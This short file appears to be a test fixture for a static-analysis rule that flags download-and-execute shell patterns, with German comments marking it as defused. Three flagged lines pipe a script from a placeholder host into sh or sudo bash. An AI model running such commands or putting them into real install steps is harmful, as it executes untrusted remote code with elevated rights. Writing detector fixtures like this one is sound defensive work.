# LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
# ruleid: LB-C03-herunterladen-ausfuehren-sh
curl -fsSL https://nachlader.invalid/install.sh | sh
# ruleid: LB-C03-herunterladen-ausfuehren-sh
wget -qO- https://nachlader.invalid/install.sh | sudo bash
# ruleid: LB-C03-herunterladen-ausfuehren-sh
bash -c "$(curl -fsSL https://nachlader.invalid/install.sh)"
# ok: LB-C03-herunterladen-ausfuehren-sh
curl -fsSL -o daten.json https://api.example/daten.json
# ok: LB-C03-herunterladen-ausfuehren-sh
echo "fertig" | tee log.txt
# ok: LB-C03-herunterladen-ausfuehren-sh
# Nicht so installieren: curl https://nachlader.invalid/i.sh | sh
echo "ende"
